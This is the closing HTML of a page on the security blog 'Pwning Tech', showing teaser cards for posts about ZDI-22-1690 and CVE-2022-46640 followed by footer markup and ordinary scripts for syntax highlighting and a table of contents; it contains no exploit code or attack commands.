                <div class="post-card-excerpt">December 22nd 2022: it's Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-08-04">Aug 4, 2023</time>
                <span class="post-card-meta-length">10 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/cve-2022-46640/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    How I hacked IoT management apps: the story behind CVE-2022-46640
                </h2>
            </header>
                <div class="post-card-excerpt">Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost,</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-03-08">Mar 8, 2023</time>
                <span class="post-card-meta-length">8 min read</span>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://pwning.tech">Pwning Tech</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=f1520b075e"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>

<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" integrity="sha512-AKaNmg8COK0zEbjTdMHJAPJ0z6VeNqvRvH4/d5M4sHJbQQUToMBtodq4HaV4fa+WV2UTfoperElm66c9/8cKmQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js" integrity="sha512-8VrjxGFLIkS0mgEmO3p46A5OkqATHhrNVwyv2V7yUeZrk1jmSDuI3SOEpC9XHEHUWEOsfzzcJeBlUkee9lKGrw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" integrity="sha512-whYhDwtTmlC/NpZlCr6PSsAaLOrfjVg/iXAnC4H/dtiHawpShhT2SlIMbpIhT/IL/NrpdMm+Hq2C13+VKpHTYw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js" integrity="sha512-+8BiRfWso6waiFDv6tEmWF8yfPGgxAtOYLDUB0rRISLwtpxkJ9lpPNUhxwWlikn3qSO+4RQyzDppi62o3ON/AA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js" integrity="sha512-plzrTi61ltEMFf84gTVO9IkvIMfBu07bnDuahvdlIclmFWzXJ9VcRsny9d45sxFZRv3jJg/MHNyuxnUYEMxMEg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-http.min.js" integrity="sha512-3KphgbiKTzK2CNxlSgUKypipTV7tWknO5czNb+E7H4CeHOOSer2s2rIOCTuz8NsY1zm+B9tP9Ul2JX/tmdyOYg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js" integrity="sha512-QXFMVAusM85vUYDaNgcYeU3rzSlc+bTV4JvkfJhjxSHlQEo+ig53BtnGkvFTiNJh8D+wv6uWAQ2vJaVmxe8d3w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-diff.min.js" integrity="sha512-tBR4SAva+2bw36ToxaFeOEvgqxWHON25E9xp+kEBfw175sS5OusQEH8GrigKgTdHUXcKsK1yiyfo7fctBYl+rA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-toml.min.js" integrity="sha512-R9JG7uVdcjWlZvEWyP3KfxtexvT1uIlKUF/dYVmZRbvJyMobK6zGCpIM2gLVqYjLSYeL/zBjOVpP7vXxVtzfCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js" integrity="sha512-BttltKXFyWnGZQcRWj6osIg7lbizJchuAMotOkdLxHxwt/Hyo+cl47bZU0QADg+Qt5DJwni3SbYGXeGMB5cBcw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>
    $("pre").addClass("line-numbers");
</script>

<script>
      $('.gh-content').prepend('<aside class="gh-sidebar"><div class="gh-toc"></div></aside>');
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.min.js"></script>
<script>
    tocbot.init({
        tocSelector: '.gh-toc',
        contentSelector: '.gh-content',
        headingSelector: 'h1, h2, h3, h4',
        hasInnerContainers: true,
  		collapseDepth: 2
    });
</script>

<script>
      $('.gh-toc').prepend('<h5>Table of contents</h5>');
</script>

<script>
  $('.gh-burger').attr('aria-label', 'menu button');
  $('.gh-search').attr('aria-label', 'search button');
  $(".author-name a").attr("aria-label", "author notselwyn");
  $(".author-profile-image").attr("aria-label", "author notselwyn");
</script>

</body>
</html>
